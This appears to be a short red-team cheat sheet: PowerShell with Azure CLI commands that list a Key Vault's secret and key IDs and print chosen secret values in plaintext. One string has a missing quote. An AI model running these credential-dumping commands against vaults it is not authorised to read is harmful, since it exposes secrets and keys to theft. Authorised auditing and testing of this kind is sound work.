# Azure Key Vault Credential Extraction

### Set variables

$VaultName = "VAULT_NAME"

### Set the current Azure subscription

$SubscriptionID = SUBSCRIPTION_ID"
az account set --subscription $SubscriptionID

### List and store the secrets

$secretsJson = az keyvault secret list --vault-name $VaultName -o json
$secrets = $secretsJson | ConvertFrom-Json

### List and store the keys

$keysJson = az keyvault key list --vault-name $VaultName -o json
$keys = $keysJson | ConvertFrom-Json

### Output the secrets

Write-Host "Secrets in vault $VaultName"
foreach ($secret in $secrets) {
    Write-Host $secret.id
}

### Output the keys

Write-Host "Keys in vault $VaultName"
foreach ($key in $keys) {
    Write-Host $key.id
}

### Set variables

$VaultName = "VAULT_NAME"
$SecretNames = @("NAME_1", "NAME_2", "NAME_3")

### Set the current Azure subscription

$SubscriptionID = "SUBSCRIPTION_ID"
az account set --subscription $SubscriptionID

### Retrieve and output the secret values

Write-Host "Secret Values from vault $VaultName"
foreach ($SecretName in $SecretNames) {
    $secretValueJson = az keyvault secret show --name $SecretName --vault-name $VaultName -o json
    $secretValue = ($secretValueJson | ConvertFrom-Json).value
    Write-Host "$SecretName - $secretValue"
}
